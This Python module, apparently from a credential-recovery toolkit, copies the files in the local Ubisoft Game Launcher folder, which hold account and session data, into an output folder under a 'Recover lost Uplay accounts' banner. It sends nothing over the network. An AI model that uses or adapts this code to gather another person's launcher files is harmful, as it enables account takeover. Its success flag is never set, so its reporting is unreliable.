import os
import shutil

from config import ModuleManager, Constant


class UplayRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_path="applications/uplay")
        
        self.banner(r"""
     _______         _     _        __               
    |.-----.|       (_)   (_)      (__)              
    ||x . x||       (_)   (_) ____  (_)  ____  _   _ 
    ||_.-._||       (_)   (_)(____) (_) (____)(_) (_)
    `--)-(--`       (_)___(_)(_)_(_)(_)( )_( )(_)_(_)
   __[=== o]___      (_____) (____)(___)(__)_) (____)
  |:::::::::::|\             (_)                __(_)            
  `-=========-`()            (_)               (___) 
                        
                       Recover lost Uplay accounts
                    """)

        self.uplay_path = Constant.local_dir / "Ubisoft Game Launcher"

    def run(self) -> None:
        recovered = False
        if os.path.isdir(self.uplay_path):
            for item in os.listdir(self.uplay_path):
                if os.path.isfile(os.path.join(self.uplay_path, item)):
                    try:
                        shutil.copy(os.path.join(self.uplay_path, item), os.path.join(self.module_output, item))
                    except Exception as e:
                        self.merror(f"Unable to copy {os.path.join(self.uplay_path, item)} to {os.path.join(self.module_output, item)} -> {e}")
        else:
            self.mdebug(f"Unable to find Uplay installation at: {self.uplay_path}")

        if recovered:
            self.mprint(f"Recovered Uplay")
        else:
            self.merror(f"Unable to recover Uplay")
